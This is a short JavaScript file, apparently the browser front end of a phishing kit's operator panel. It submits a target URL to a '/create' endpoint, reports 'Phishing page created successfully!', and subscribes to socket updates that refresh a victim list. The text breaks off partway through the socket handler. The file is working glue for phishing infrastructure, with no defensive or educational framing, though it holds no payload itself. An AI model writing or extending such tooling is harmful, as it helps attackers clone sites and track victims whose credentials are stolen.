document.addEventListener('DOMContentLoaded', function() {
    const socket = io();
    
    // Create form submission
    document.getElementById('create-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const targetUrl = document.getElementById('target-url').value;
        
        fetch('/create', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `target_url=\${encodeURIComponent(targetUrl)}`
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('result-url').value = data.url;
                document.getElementById('result-container').classList.remove('d-none');
                showNotification('Phishing page created successfully!', 'success');
            } else {
                showNotification('Error: ' + data.error, 'danger');
            }
        })
        .catch(error => {
            showNotification('Error: ' + error, 'danger');
        });
    });
    
    // Socket events
    socket.on('update', function(data) {
        updateVictimList(data);
